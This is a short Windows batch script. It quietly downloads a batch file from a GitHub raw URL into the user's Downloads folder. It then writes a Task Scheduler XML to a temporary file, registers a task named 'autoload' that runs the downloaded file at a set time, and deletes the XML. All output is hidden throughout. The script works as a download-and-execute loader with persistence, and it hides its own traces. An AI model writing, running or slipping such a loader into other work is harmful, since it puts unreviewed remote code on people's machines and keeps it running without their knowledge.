@echo off
setlocal enabledelayedexpansion

set "download_url=https://raw.githubusercontent.com/wakataG/autoload/main/mainfile.bat"
set "bat_path=%USERPROFILE%\Downloads\mainfile.bat"
set "xmlfile=%TEMP%\task_%RANDOM%.xml"

powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%bat_path%'" >nul 2>nul

(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
echo       ^<LogonType^>InteractiveToken^</LogonType^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<ExecutionTimeLimit^>PT1H^</ExecutionTimeLimit^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo   ^</Settings^>
echo   ^<Triggers^>
echo     ^<TimeTrigger^>
echo       ^<StartBoundary^>2026-01-19T22:05:00^</StartBoundary^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</TimeTrigger^>
echo   ^</Triggers^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>"%bat_path%"^</Command^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "%xmlfile%"

schtasks /create /tn "autoload" /xml "%xmlfile%" /f >nul 2>nul

del "%xmlfile%" 2>nul



